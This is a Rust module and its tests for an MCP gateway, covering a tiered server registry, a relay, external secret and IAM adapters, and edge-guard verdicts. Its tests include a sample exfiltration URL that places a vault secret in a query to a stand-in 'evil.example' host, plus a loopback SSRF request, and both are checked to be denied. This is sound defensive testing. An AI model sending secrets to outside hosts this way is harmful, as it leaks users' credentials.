//! Tiered MCP registry and cloud relay sockets. No cloud SDK is linked here.

use std::collections::BTreeMap;
use std::sync::Arc;

use serde_json::{Value, json};

use crate::GateError;
use crate::connector::ConnectorManifest;
use crate::registry::{self, connector_to_registry_entry};
use crate::vault::{Vault, VaultSecretMetadata};

/// Where a registry row was discovered.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum RegistryTier {
    LocalMachine,
    MultiNodeHub,
    CloudProvider { provider: String },
}

/// One registry server tagged with the tier that produced it.
#[derive(Clone, Debug, PartialEq)]
pub struct TieredRegistryEntry {
    pub tier: RegistryTier,
    pub server: Value,
}

/// A hub or cloud catalog. `list_servers` returns v0.1 entries or bare server objects.
pub trait McpRegistryAdapter: Send + Sync {
    fn provider_name(&self) -> &str;

    fn tier(&self) -> RegistryTier;

    fn list_servers(&self) -> Result<Vec<Value>, GateError>;

    /// Publish registry rows. The default accepts them and reports nothing published.
    fn publish_servers(&self, _entries: &[Value]) -> Result<usize, GateError> {
        Ok(0)
    }
}

/// Map `connectors` with [`connector_to_registry_entry`] and publish that list.
pub fn publish_connectors_to_registry(
    connectors: &[ConnectorManifest],
    hub_base_url: &str,
    adapter: &dyn McpRegistryAdapter,
) -> Result<usize, GateError> {
    let entries: Vec<Value> = connectors
        .iter()
        .map(|connector| connector_to_registry_entry(connector, hub_base_url))
        .collect();
    adapter.publish_servers(&entries)
}

/// Forwards one MCP JSON-RPC request to a remote connector.
pub trait McpRelayAdapter: Send + Sync {
    fn provider_name(&self) -> &str;

    fn forward_jsonrpc(
        &self,
        connector_id: &str,
        request: &Value,
    ) -> Result<Option<Value>, GateError>;
}

/// `GET` under `/v0.1/servers`, merging local connectors with `adapters`.
///
/// Local rows win on `server.name`. `?tier=local|hub|cloud` filters after that.
/// Any other `tier` value is HTTP 400.
pub fn handle_tiered_registry_v01_get(
    subpath: &str,
    query: &BTreeMap<String, String>,
    connectors: &[ConnectorManifest],
    hub_base_url: &str,
    adapters: &[Arc<dyn McpRegistryAdapter>],
) -> (u16, Value) {
    if let Some(tier) = query.get("tier")
        && !matches!(tier.as_str(), "local" | "hub" | "cloud")
    {
        return (
            400,
            json!({
                "title": "Bad Request",
                "status": 400,
                "detail": "query tier must be local, hub, or cloud"
            }),
        );
    }

    let mut entries = Vec::new();
    for connector in connectors {
        push_unique(
            &mut entries,
            tag_entry(
                connector_to_registry_entry(connector, hub_base_url),
                "local",
            ),
        );
    }
    // A `tier` filter keeps only that tier, so adapters of a later tier cannot change the
    // answer (earlier tiers win on a name clash) and are not asked: a failing cloud adapter
    // must not turn `?tier=local` or `?tier=hub` into a 502.
    let last_rank: i32 = match query.get("tier").map(String::as_str) {
        Some("local") => -1,
        Some("hub") => 1,
        _ => 2,
    };
    for rank in 0..=last_rank {
        for adapter in adapters
            .iter()
            .filter(|adapter| tier_rank(&adapter.tier()) as i32 == rank)
        {
            let listed = match adapter.list_servers() {
                Ok(listed) => listed,
                Err(err) => {
                    return (
                        502,
                        json!({
                            "title": "Bad Gateway",
                            "status": 502,
                            "detail": err.to_string()
                        }),
                    );
                }
            };
            let tier = tier_label(&adapter.tier());
            for item in listed {
                push_unique(&mut entries, tag_entry(item, tier));
            }
        }
    }
    if let Some(tier) = query.get("tier") {
        entries.retain(|entry| entry_tier(entry) == Some(tier.as_str()));
    }
    registry::respond_registry_v01(subpath, query, entries)
}

/// Forward `request` through `adapter` for `connector_id`.
pub fn forward_mcp_relay(
    adapter: &dyn McpRelayAdapter,
    connector_id: &str,
    request: &Value,
) -> Result<Option<Value>, GateError> {
    adapter.forward_jsonrpc(connector_id, request)
}

/// IAM allow or deny. `Deny` names the policy that refused the call.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum IamDecision {
    Allow,
    Deny { policy: String, reason: String },
}

/// A secret resolved outside the local vault. `value` is plaintext, so `Debug` redacts it: a
/// `{:?}` of this type, or of a `Result` or log record holding one, must not print the secret.
#[derive(Clone)]
pub struct ExternalSecret {
    pub metadata: VaultSecretMetadata,
    pub value: String,
}

impl std::fmt::Debug for ExternalSecret {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("ExternalSecret")
            .field("metadata", &self.metadata)
            .field("value", &"[REDACTED]")
            .finish()
    }
}

/// Google Cloud Secret Manager and IAM, without a cloud SDK.
pub trait SecretProviderAdapter: Send + Sync {
    fn provider_name(&self) -> &str;

    fn resolve_secret(
        &self,
        name: &str,
        caller_agent: Option<&str>,
    ) -> Result<Option<ExternalSecret>, GateError>;

    fn check_tool_authorization(
        &self,
        _caller_agent: Option<&str>,
        _connector_id: &str,
        _tool_name: &str,
    ) -> Result<IamDecision, GateError> {
        Ok(IamDecision::Allow)
    }
}

/// Local ciphertext first. A provider runs only for [`GateError::NoSuchSecret`].
pub fn resolve_vault_secret(
    vault: &Vault,
    provider: Option<&dyn SecretProviderAdapter>,
    name: &str,
    caller_agent: Option<&str>,
) -> Result<(VaultSecretMetadata, String), GateError> {
    match vault.decrypt_raw(name) {
        Ok(pair) => Ok(pair),
        Err(GateError::NoSuchSecret { name }) => {
            let Some(provider) = provider else {
                return Err(GateError::NoSuchSecret { name });
            };
            match provider.resolve_secret(&name, caller_agent)? {
                Some(secret) => Ok((secret.metadata, secret.value)),
                None => Err(GateError::NoSuchSecret { name }),
            }
        }
        Err(err) => Err(err),
    }
}

/// `Allow` is success. `Deny` is [`GateError::PolicyDenied`] with `secret` set to `policy`.
pub fn authorize_mcp_tool(
    provider: &dyn SecretProviderAdapter,
    caller_agent: Option<&str>,
    connector_id: &str,
    tool_name: &str,
) -> Result<(), GateError> {
    match provider.check_tool_authorization(caller_agent, connector_id, tool_name)? {
        IamDecision::Allow => Ok(()),
        IamDecision::Deny { policy, reason } => Err(GateError::PolicyDenied {
            secret: policy,
            reason,
        }),
    }
}

/// Where an edge guard inspects a payload. Not wired into the MCP handler.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum GuardStage {
    AttemptPrompt,
    WireMessage,
    McpToolInput,
    McpToolOutput,
    InboundWebhook,
}

/// Model Armor style verdict. No cloud SDK is linked here.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum GuardVerdict {
    Allow,
    Sanitize {
        redacted_payload: String,
        findings: Vec<String>,
    },
    Block {
        rule_id: String,
        reason: String,
    },
}

/// Inspect one payload. The store and the hub do not call this.
pub trait EdgeGuardAdapter: Send + Sync {
    fn provider_name(&self) -> &str;

    fn inspect_payload(
        &self,
        stage: GuardStage,
        caller_agent: Option<&str>,
        target: &str,
        payload: &str,
    ) -> Result<GuardVerdict, GateError>;
}

/// `Allow` returns `payload`. `Sanitize` returns the redacted text.
/// `Block` is [`GateError::PolicyDenied`] with `secret` `edge-guard:{rule_id}`.
pub fn evaluate_edge_guard(
    guard: &dyn EdgeGuardAdapter,
    stage: GuardStage,
    caller_agent: Option<&str>,
    target: &str,
    payload: &str,
) -> Result<String, GateError> {
    match guard.inspect_payload(stage, caller_agent, target, payload)? {
        GuardVerdict::Allow => Ok(payload.to_string()),
        GuardVerdict::Sanitize {
            redacted_payload, ..
        } => Ok(redacted_payload),
        GuardVerdict::Block { rule_id, reason } => Err(GateError::PolicyDenied {
            secret: format!("edge-guard:{rule_id}"),
            reason,
        }),
    }
}

fn tier_rank(tier: &RegistryTier) -> u8 {
    match tier {
        RegistryTier::LocalMachine => 0,
        RegistryTier::MultiNodeHub => 1,
        RegistryTier::CloudProvider { .. } => 2,
    }
}

fn tier_label(tier: &RegistryTier) -> &'static str {
    match tier {
        RegistryTier::LocalMachine => "local",
        RegistryTier::MultiNodeHub => "hub",
        RegistryTier::CloudProvider { .. } => "cloud",
    }
}

fn tag_entry(mut entry: Value, tier: &str) -> Value {
    if entry.get("server").and_then(Value::as_object).is_none() {
        entry = json!({ "server": entry });
    }
    let Some(map) = entry.as_object_mut() else {
        return entry;
    };
    let tier_value = json!(tier);
    match map.get_mut("_meta") {
        Some(Value::Object(meta)) => {
            meta.insert("io.ferroloop.gate/tier".to_string(), tier_value);
        }
        _ => {
            map.insert(
                "_meta".to_string(),
                json!({ "io.ferroloop.gate/tier": tier }),
            );
        }
    }
    entry
}

fn entry_tier(entry: &Value) -> Option<&str> {
    entry.get("_meta")?.get("io.ferroloop.gate/tier")?.as_str()
}

fn server_name(entry: &Value) -> Option<&str> {
    entry.get("server")?.get("name")?.as_str()
}

fn push_unique(entries: &mut Vec<Value>, entry: Value) {
    if let Some(name) = server_name(&entry)
        && entries
            .iter()
            .any(|existing| server_name(existing) == Some(name))
    {
        return;
    }
    entries.push(entry);
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::connector::{ConnectorManifest, ConnectorToolDef};
    use crate::mcp::handle_mcp_jsonrpc_request_with_secret_provider;
    use crate::proxy::{
        ProxyRequest, prepare_proxied_request, prepare_proxied_request_with_provider,
    };
    use crate::vault::{SetSecretArgs, Vault, load_or_init_master_key};
    use std::sync::Mutex;
    use std::sync::atomic::{AtomicUsize, Ordering};

    fn manifest(id: &str, description: &str) -> ConnectorManifest {
        ConnectorManifest {
            id: id.into(),
            title: id.into(),
            version: "1.2.3".into(),
            description: description.into(),
            base_url: "https://example.com".into(),
            allowed_hosts: Vec::new(),
            default_headers: BTreeMap::new(),
            enabled: true,
            tools: Vec::new(),
            bridges: Vec::new(),
        }
    }

    struct ListAdapter {
        name: &'static str,
        tier: RegistryTier,
        servers: Vec<Value>,
    }

    impl McpRegistryAdapter for ListAdapter {
        fn provider_name(&self) -> &str {
            self.name
        }

        fn tier(&self) -> RegistryTier {
            self.tier.clone()
        }

        fn list_servers(&self) -> Result<Vec<Value>, GateError> {
            Ok(self.servers.clone())
        }
    }

    fn adapters() -> Vec<Arc<dyn McpRegistryAdapter>> {
        let shared = "io.ferroloop.gate/shared";
        vec![
            Arc::new(ListAdapter {
                name: "hub",
                tier: RegistryTier::MultiNodeHub,
                servers: vec![
                    json!({
                        "server": {
                            "name": shared,
                            "description": "hub copy",
                            "version": "9.9.9"
                        },
                        "_meta": { "io.ferroloop.gate/tier": "local" }
                    }),
                    json!({
                        "server": {
                            "name": "hub.example/only",
                            "description": "hub-doc",
                            "version": "1.0.0"
                        },
                        "_meta": {}
                    }),
                ],
            }),
            Arc::new(ListAdapter {
                name: "gcp",
                tier: RegistryTier::CloudProvider {
                    provider: "gcp".into(),
                },
                servers: vec![
                    json!({
                        "name": shared,
                        "description": "cloud copy",
                        "version": "0.0.1"
                    }),
                    json!({
                        "name": "cloud.example/only",
                        "description": "cloud-doc",
                        "version": "2.0.0"
                    }),
                ],
            }),
        ]
    }

    #[test]
    fn tiered_registry_prefers_local_and_filters() {
        let connectors = vec![
            manifest("shared", "local shared"),
            manifest("local-only", "local-doc"),
        ];
        let attached = adapters();
        let (status, body) = handle_tiered_registry_v01_get(
            "/v0.1/servers",
            &BTreeMap::new(),
            &connectors,
            "http://127.0.0.1:8420",
            &attached,
        );
        assert_eq!(status, 200);
        assert_eq!(body["metadata"]["count"], 4);
        let names: Vec<&str> = body["servers"]
            .as_array()
            .unwrap()
            .iter()
            .map(|entry| entry["server"]["name"].as_str().unwrap())
            .collect();
        assert_eq!(
            names,
            vec![
                "io.ferroloop.gate/shared",
                "io.ferroloop.gate/local-only",
                "hub.example/only",
                "cloud.example/only",
            ]
        );
        let tiers: Vec<&str> = body["servers"]
            .as_array()
            .unwrap()
            .iter()
            .map(|entry| entry["_meta"]["io.ferroloop.gate/tier"].as_str().unwrap())
            .collect();
        assert_eq!(tiers, vec!["local", "local", "hub", "cloud"]);
        assert_eq!(body["servers"][0]["server"]["version"], "1.2.3");

        let mut reversed = attached.clone();
        reversed.reverse();
        let (status, body) = handle_tiered_registry_v01_get(
            "/v0.1/servers",
            &BTreeMap::new(),
            &[],
            "http://127.0.0.1:8420",
            &reversed,
        );
        assert_eq!(status, 200);
        assert_eq!(
            body["servers"][0]["server"]["name"],
            "io.ferroloop.gate/shared"
        );
        assert_eq!(body["servers"][0]["server"]["version"], "9.9.9");
        assert_eq!(body["servers"][0]["_meta"]["io.ferroloop.gate/tier"], "hub");

        let mut query = BTreeMap::new();
        query.insert("tier".into(), "cloud".into());
        let (status, body) = handle_tiered_registry_v01_get(
            "/v0.1/servers",
            &query,
            &connectors,
            "http://127.0.0.1:8420",
            &attached,
        );
        assert_eq!(status, 200);
        assert_eq!(body["metadata"]["count"], 1);
        assert_eq!(body["servers"][0]["server"]["name"], "cloud.example/only");
        assert_eq!(
            body["servers"][0]["_meta"]["io.ferroloop.gate/tier"],
            "cloud"
        );

        query.insert("tier".into(), "nope".into());
        let (status, body) = handle_tiered_registry_v01_get(
            "/v0.1/servers",
            &query,
            &connectors,
            "http://127.0.0.1:8420",
            &attached,
        );
        assert_eq!(status, 400);
        assert_eq!(body["status"], 400);
        assert!(body["title"].is_string());
        assert!(body["detail"].is_string());

        let mut search = BTreeMap::new();
        search.insert("search".into(), "hub-doc".into());
        let (status, body) = handle_tiered_registry_v01_get(
            "/v0.1/servers",
            &search,
            &connectors,
            "http://127.0.0.1:8420",
            &attached,
        );
        assert_eq!(status, 200);
        assert_eq!(body["metadata"]["count"], 1);
        assert_eq!(body["servers"][0]["server"]["name"], "hub.example/only");
    }

    struct RecRelay {
        calls: Mutex<Vec<(String, Value)>>,
        result: Option<Value>,
        fail: bool,
    }

    impl McpRelayAdapter for RecRelay {
        fn provider_name(&self) -> &str {
            "cloud-run"
        }

        fn forward_jsonrpc(
            &self,
            connector_id: &str,
            request: &Value,
        ) -> Result<Option<Value>, GateError> {
            self.calls
                .lock()
                .unwrap()
                .push((connector_id.to_string(), request.clone()));
            if self.fail {
                return Err(GateError::Adapter {
                    provider: self.provider_name().into(),
                    reason: "relay down".into(),
                });
            }
            Ok(self.result.clone())
        }
    }

    #[test]
    fn relay_forwards_the_request_and_surfaces_adapter_errors() {
        let request = json!({"jsonrpc": "2.0", "id": 1, "method": "tools/list"});
        let adapter = RecRelay {
            calls: Mutex::new(Vec::new()),
            result: Some(json!({"ok": true})),
            fail: false,
        };
        let got = forward_mcp_relay(&adapter, "discord", &request).unwrap();
        assert_eq!(got, Some(json!({"ok": true})));
        let calls = adapter.calls.lock().unwrap().clone();
        assert_eq!(calls.len(), 1);
        assert_eq!(calls[0].0, "discord");
        assert_eq!(calls[0].1, request);

        let adapter = RecRelay {
            calls: Mutex::new(Vec::new()),
            result: None,
            fail: true,
        };
        let err = forward_mcp_relay(&adapter, "discord", &json!({})).unwrap_err();
        assert!(matches!(
            err,
            GateError::Adapter { ref provider, .. } if provider == "cloud-run"
        ));
    }

    struct RecPublish {
        seen: Mutex<Vec<Value>>,
    }

    impl McpRegistryAdapter for RecPublish {
        fn provider_name(&self) -> &str {
            "publish"
        }

        fn tier(&self) -> RegistryTier {
            RegistryTier::CloudProvider {
                provider: "gcp".into(),
            }
        }

        fn list_servers(&self) -> Result<Vec<Value>, GateError> {
            Ok(Vec::new())
        }

        fn publish_servers(&self, entries: &[Value]) -> Result<usize, GateError> {
            *self.seen.lock().unwrap() = entries.to_vec();
            Ok(3)
        }
    }

    #[test]
    fn publish_connectors_to_registry_maps_entries_and_returns_the_adapter_count() {
        let connectors = vec![manifest("shared", "local shared"), manifest("other", "doc")];
        let adapter = RecPublish {
            seen: Mutex::new(Vec::new()),
        };
        let hub = "http://127.0.0.1:8420";
        let count = publish_connectors_to_registry(&connectors, hub, &adapter).unwrap();
        assert_eq!(count, 3);
        let seen = adapter.seen.lock().unwrap().clone();
        assert_eq!(seen.len(), 2);
        for (connector, entry) in connectors.iter().zip(seen.iter()) {
            assert_eq!(entry, &connector_to_registry_entry(connector, hub));
            assert_eq!(
                entry["server"]["name"],
                format!("io.ferroloop.gate/{}", connector.id)
            );
            let url = entry["server"]["remotes"][0]["url"].as_str().unwrap();
            assert!(url.contains(hub), "{url}");
            assert!(url.contains(&connector.id), "{url}");
        }

        let listing = ListAdapter {
            name: "local",
            tier: RegistryTier::LocalMachine,
            servers: Vec::new(),
        };
        assert_eq!(
            publish_connectors_to_registry(&connectors, hub, &listing).unwrap(),
            0
        );
    }

    fn external_meta(name: &str, hosts: &[&str], allow_private: bool) -> VaultSecretMetadata {
        VaultSecretMetadata {
            name: name.into(),
            description: None,
            allowed_hosts: hosts.iter().map(|host| (*host).to_string()).collect(),
            allowed_methods: Vec::new(),
            allowed_agents: Vec::new(),
            allow_private_network: allow_private,
            created_at: "2026-10-30T00:00:00Z".into(),
            updated_at: "2026-10-30T00:00:00Z".into(),
            lease_ttl_secs: None,
            expires_at: None,
        }
    }

    struct CountingProvider {
        calls: AtomicUsize,
        secret: Mutex<Option<ExternalSecret>>,
        decision: Mutex<IamDecision>,
        fail: Mutex<Option<GateError>>,
    }

    impl CountingProvider {
        fn with_secret(secret: Option<ExternalSecret>) -> Self {
            Self {
                calls: AtomicUsize::new(0),
                secret: Mutex::new(secret),
                decision: Mutex::new(IamDecision::Allow),
                fail: Mutex::new(None),
            }
        }
    }

    impl SecretProviderAdapter for CountingProvider {
        fn provider_name(&self) -> &str {
            "gcp-sm"
        }

        fn resolve_secret(
            &self,
            name: &str,
            _caller_agent: Option<&str>,
        ) -> Result<Option<ExternalSecret>, GateError> {
            self.calls.fetch_add(1, Ordering::SeqCst);
            if let Some(err) = self.fail.lock().unwrap().take() {
                return Err(err);
            }
            Ok(self
                .secret
                .lock()
                .unwrap()
                .clone()
                .filter(|secret| secret.metadata.name == name))
        }

        fn check_tool_authorization(
            &self,
            _caller_agent: Option<&str>,
            _connector_id: &str,
            _tool_name: &str,
        ) -> Result<IamDecision, GateError> {
            if let Some(err) = self.fail.lock().unwrap().take() {
                return Err(err);
            }
            Ok(self.decision.lock().unwrap().clone())
        }
    }

    struct DefaultAllow;

    impl SecretProviderAdapter for DefaultAllow {
        fn provider_name(&self) -> &str {
            "default"
        }

        fn resolve_secret(
            &self,
            _name: &str,
            _caller_agent: Option<&str>,
        ) -> Result<Option<ExternalSecret>, GateError> {
            Ok(None)
        }
    }

    fn open_vault() -> (tempfile::TempDir, Vault) {
        let tmp = tempfile::tempdir().unwrap();
        let key = load_or_init_master_key(&tmp.path().join("vault.key")).unwrap();
        let vault = Vault::open(tmp.path().join("vault.enc"), key).unwrap();
        (tmp, vault)
    }

    fn proxy_req(url: &str) -> ProxyRequest {
        ProxyRequest {
            method: "GET".into(),
            url: url.into(),
            headers: BTreeMap::new(),
            body: None,
            caller_agent: Some("felicia".into()),
            timeout_secs: None,
        }
    }

    #[test]
    fn secret_provider_prefers_the_local_vault_and_keeps_proxy_policy() {
        let (_tmp, mut vault) = open_vault();
        vault
            .set(SetSecretArgs {
                name: "LOCAL_KEY".into(),
                value: "local-secret-value".into(),
                allowed_hosts: vec!["example.com".into()],
                ..SetSecretArgs::default()
            })
            .unwrap();
        let provider = CountingProvider::with_secret(Some(ExternalSecret {
            metadata: external_meta("EXT_KEY", &["example.com"], false),
            value: "external-secret-value".into(),
        }));
        let (meta, value) =
            resolve_vault_secret(&vault, Some(&provider), "LOCAL_KEY", Some("felicia")).unwrap();
        assert_eq!(value, "local-secret-value");
        assert_eq!(meta.name, "LOCAL_KEY");
        assert_eq!(provider.calls.load(Ordering::SeqCst), 0);

        let (meta, value) =
            resolve_vault_secret(&vault, Some(&provider), "EXT_KEY", Some("felicia")).unwrap();
        assert_eq!(value, "external-secret-value");
        assert_eq!(meta.allowed_hosts, vec!["example.com".to_string()]);
        assert_eq!(provider.calls.load(Ordering::SeqCst), 1);

        let missing = resolve_vault_secret(&vault, Some(&provider), "missing", None).unwrap_err();
        assert!(
            matches!(missing, GateError::NoSuchSecret { ref name } if name == "MISSING"),
            "{missing}"
        );

        let invalid = resolve_vault_secret(&vault, Some(&provider), "bad name", None).unwrap_err();
        assert!(
            matches!(invalid, GateError::InvalidSecret { .. }),
            "{invalid}"
        );
        assert_eq!(provider.calls.load(Ordering::SeqCst), 2);

        let none = CountingProvider::with_secret(None);
        let err = resolve_vault_secret(&vault, Some(&none), "ABSENT", None).unwrap_err();
        assert!(matches!(err, GateError::NoSuchSecret { ref name } if name == "ABSENT"));

        assert!(matches!(
            authorize_mcp_tool(&DefaultAllow, None, "discord", "send"),
            Ok(())
        ));
        assert!(matches!(
            DefaultAllow.check_tool_authorization(None, "discord", "send"),
            Ok(IamDecision::Allow)
        ));
        *provider.decision.lock().unwrap() = IamDecision::Deny {
            policy: "organizations/1/policy".into(),
            reason: "no binding".into(),
        };
        let denied = authorize_mcp_tool(&provider, Some("felicia"), "discord", "send").unwrap_err();
        match denied {
            GateError::PolicyDenied { secret, reason } => {
                assert_eq!(secret, "organizations/1/policy");
                assert_eq!(reason, "no binding");
            }
            other => panic!("{other}"),
        }
        *provider.fail.lock().unwrap() = Some(GateError::Adapter {
            provider: "gcp-sm".into(),
            reason: "iam down".into(),
        });
        let failed = authorize_mcp_tool(&provider, None, "discord", "send").unwrap_err();
        assert!(
            matches!(failed, GateError::Adapter { ref reason, .. } if reason == "iam down"),
            "{failed}"
        );

        let prepared = prepare_proxied_request_with_provider(
            &vault,
            &proxy_req("https://example.com/q?token={{FERROGATE:EXT_KEY}}"),
            Some(&provider),
        )
        .unwrap();
        assert!(
            prepared.url.contains("external-secret-value"),
            "{}",
            prepared.url
        );
        assert!(!prepared.url.contains("{{FERROGATE:"));
        assert_eq!(prepared.host, "example.com");

        let denied_host = prepare_proxied_request_with_provider(
            &vault,
            &proxy_req("https://evil.example/q?token={{FERROGATE:EXT_KEY}}"),
            Some(&provider),
        )
        .unwrap_err();
        assert!(
            matches!(denied_host, GateError::PolicyDenied { .. }),
            "{denied_host}"
        );

        let provider = CountingProvider::with_secret(Some(ExternalSecret {
            metadata: external_meta("EXT_KEY", &["127.0.0.1"], true),
            value: "external-secret-value".into(),
        }));
        let ssrf = prepare_proxied_request_with_provider(
            &vault,
            &proxy_req("http://127.0.0.1/q?token={{FERROGATE:EXT_KEY}}"),
            Some(&provider),
        )
        .unwrap_err();
        assert!(matches!(ssrf, GateError::SsrfBlocked { .. }), "{ssrf}");

        let absent = prepare_proxied_request(
            &vault,
            &proxy_req("https://example.com/q?token={{FERROGATE:NOT_THERE}}"),
        )
        .unwrap_err();
        assert!(
            matches!(absent, GateError::NoSuchSecret { ref name } if name == "NOT_THERE"),
            "{absent}"
        );
    }

    fn connector_with_tool() -> ConnectorManifest {
        ConnectorManifest {
            id: "discord".into(),
            title: "Discord".into(),
            version: "1.0.0".into(),
            description: "discord".into(),
            base_url: "http://127.0.0.1:1".into(),
            allowed_hosts: vec!["127.0.0.1".into()],
            default_headers: BTreeMap::new(),
            enabled: true,
            tools: vec![ConnectorToolDef {
                name: "discord_send".into(),
                description: "send".into(),
                method: "GET".into(),
                path: "/messages".into(),
                path_params: Vec::new(),
                query_params: Vec::new(),
                body_params: Vec::new(),
                headers: BTreeMap::new(),
                response_fields: Vec::new(),
                input_schema: json!({"type": "object", "properties": {}}),
            }],
            bridges: Vec::new(),
        }
    }

    #[test]
    fn mcp_tool_call_denial_is_an_error_result_without_an_http_call() {
        let (_tmp, vault) = open_vault();
        let connector = connector_with_tool();
        let provider = CountingProvider::with_secret(None);
        *provider.decision.lock().unwrap() = IamDecision::Deny {
            policy: "organizations/1/policy".into(),
            reason: "no binding".into(),
        };
        let response = handle_mcp_jsonrpc_request_with_secret_provider(
            &json!({
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/call",
                "params": { "name": "discord_send", "arguments": {} }
            }),
            &vault,
            std::slice::from_ref(&connector),
            None,
            Some("felicia".into()),
            Some(&provider),
        )
        .unwrap();
        assert_eq!(response["result"]["isError"], true);
        let text = response["result"]["content"][0]["text"].as_str().unwrap();
        let expected = GateError::PolicyDenied {
            secret: "organizations/1/policy".into(),
            reason: "no binding".into(),
        };
        assert_eq!(text, expected.to_string());
        assert!(!text.contains("upstream"));
    }

    enum ScriptedVerdict {
        Ready(GuardVerdict),
        Fail,
    }

    struct GuardSeen {
        stage: GuardStage,
        caller: Option<String>,
        target: String,
        payload: String,
    }

    struct RecGuard {
        seen: Mutex<Option<GuardSeen>>,
        verdict: Mutex<ScriptedVerdict>,
    }

    impl EdgeGuardAdapter for RecGuard {
        fn provider_name(&self) -> &str {
            "model-armor"
        }

        fn inspect_payload(
            &self,
            stage: GuardStage,
            caller_agent: Option<&str>,
            target: &str,
            payload: &str,
        ) -> Result<GuardVerdict, GateError> {
            *self.seen.lock().unwrap() = Some(GuardSeen {
                stage,
                caller: caller_agent.map(str::to_string),
                target: target.to_string(),
                payload: payload.to_string(),
            });
            match &*self.verdict.lock().unwrap() {
                ScriptedVerdict::Ready(verdict) => Ok(verdict.clone()),
                ScriptedVerdict::Fail => Err(GateError::Adapter {
                    provider: "model-armor".into(),
                    reason: "guard down".into(),
                }),
            }
        }
    }

    #[test]
    fn edge_guard_allow_sanitize_block_and_adapter_error() {
        let guard = RecGuard {
            seen: Mutex::new(None),
            verdict: Mutex::new(ScriptedVerdict::Ready(GuardVerdict::Allow)),
        };
        let payload = "keep me";
        assert_eq!(
            evaluate_edge_guard(
                &guard,
                GuardStage::McpToolInput,
                Some("felicia"),
                "discord.send",
                payload
            )
            .unwrap(),
            payload
        );

        *guard.verdict.lock().unwrap() = ScriptedVerdict::Ready(GuardVerdict::Sanitize {
            redacted_payload: "redacted".into(),
            findings: vec!["injection".into()],
        });
        assert_eq!(
            evaluate_edge_guard(
                &guard,
                GuardStage::WireMessage,
                Some("felicia"),
                "wire:ferris",
                payload
            )
            .unwrap(),
            "redacted"
        );
        let seen = guard.seen.lock().unwrap().take().unwrap();
        assert_eq!(seen.stage, GuardStage::WireMessage);
        assert_eq!(seen.caller.as_deref(), Some("felicia"));
        assert_eq!(seen.target, "wire:ferris");
        assert_eq!(seen.payload, payload);

        *guard.verdict.lock().unwrap() = ScriptedVerdict::Ready(GuardVerdict::Block {
            rule_id: "ma-9".into(),
            reason: "prompt injection".into(),
        });
        let blocked =
            evaluate_edge_guard(&guard, GuardStage::AttemptPrompt, None, "attempt", payload)
                .unwrap_err();
        match blocked {
            GateError::PolicyDenied { secret, reason } => {
                assert_eq!(secret, format!("edge-guard:{}", "ma-9"));
                assert_eq!(reason, "prompt injection");
            }
            other => panic!("{other}"),
        }

        *guard.verdict.lock().unwrap() = ScriptedVerdict::Fail;
        let err = evaluate_edge_guard(&guard, GuardStage::InboundWebhook, None, "hook", payload)
            .unwrap_err();
        assert!(
            matches!(err, GateError::Adapter { ref provider, ref reason }
                if provider == "model-armor" && reason == "guard down"),
            "{err}"
        );
    }

    #[test]
    fn external_secret_debug_never_prints_the_value() {
        let secret = ExternalSecret {
            metadata: external_meta("API_KEY", &["api.example.com"], false),
            value: "hunter2-plaintext".into(),
        };
        let direct = format!("{secret:?}");
        let wrapped = format!("{:?}", Ok::<_, GateError>(Some(secret.clone())));
        for shown in [&direct, &wrapped, &format!("{secret:#?}")] {
            assert!(!shown.contains("hunter2"), "{shown}");
            assert!(shown.contains("[REDACTED]"), "{shown}");
            assert!(shown.contains("API_KEY"), "metadata stays visible: {shown}");
        }
    }

    struct FailingAdapter(RegistryTier);

    impl McpRegistryAdapter for FailingAdapter {
        fn provider_name(&self) -> &str {
            "failing"
        }

        fn tier(&self) -> RegistryTier {
            self.0.clone()
        }

        fn list_servers(&self) -> Result<Vec<Value>, GateError> {
            Err(GateError::Io {
                op: "list",
                path: "/internal/cloud".into(),
                cause: "down".into(),
            })
        }
    }

    fn registry_status(tier: Option<&str>, attached: &[Arc<dyn McpRegistryAdapter>]) -> u16 {
        let mut query = BTreeMap::new();
        if let Some(tier) = tier {
            query.insert("tier".to_string(), tier.to_string());
        }
        let connectors = vec![manifest("local-only", "doc")];
        handle_tiered_registry_v01_get(
            "/v0.1/servers",
            &query,
            &connectors,
            "http://127.0.0.1:8420",
            attached,
        )
        .0
    }

    #[test]
    fn a_failing_later_tier_does_not_break_an_earlier_tier_filter() {
        let cloud_down: Vec<Arc<dyn McpRegistryAdapter>> =
            vec![Arc::new(FailingAdapter(RegistryTier::CloudProvider {
                provider: "gcp".into(),
            }))];
        assert_eq!(registry_status(Some("local"), &cloud_down), 200);
        assert_eq!(registry_status(Some("hub"), &cloud_down), 200);
        // Asking for the failing tier, or for everything, still reports the failure.
        assert_eq!(registry_status(Some("cloud"), &cloud_down), 502);
        assert_eq!(registry_status(None, &cloud_down), 502);

        let hub_down: Vec<Arc<dyn McpRegistryAdapter>> =
            vec![Arc::new(FailingAdapter(RegistryTier::MultiNodeHub))];
        assert_eq!(registry_status(Some("local"), &hub_down), 200);
        assert_eq!(registry_status(Some("hub"), &hub_down), 502);
        assert_eq!(registry_status(Some("cloud"), &hub_down), 502);
    }

    #[test]
    fn tier_filter_keeps_hub_shadowing_cloud_rows() {
        // `adapters()` has a hub row and a cloud row of the same name; skipping the hub adapter
        // for `?tier=cloud` would let the shadowed cloud row through.
        let attached = adapters();
        let connectors: Vec<ConnectorManifest> = Vec::new();
        for tier in ["local", "hub", "cloud"] {
            let query = BTreeMap::from([("tier".to_string(), tier.to_string())]);
            let (status, body) = handle_tiered_registry_v01_get(
                "/v0.1/servers",
                &query,
                &connectors,
                "http://127.0.0.1:8420",
                &attached,
            );
            assert_eq!(status, 200, "{tier}");
            for entry in body["servers"].as_array().unwrap() {
                assert_eq!(entry["_meta"]["io.ferroloop.gate/tier"], tier);
            }
        }
        let query = BTreeMap::from([("tier".to_string(), "hub".to_string())]);
        let (_, body) = handle_tiered_registry_v01_get(
            "/v0.1/servers",
            &query,
            &connectors,
            "http://127.0.0.1:8420",
            &attached,
        );
        // The adapter-supplied `_meta` tier of "local" was overwritten with the real tier.
        assert_eq!(body["metadata"]["count"], 2);
    }
}
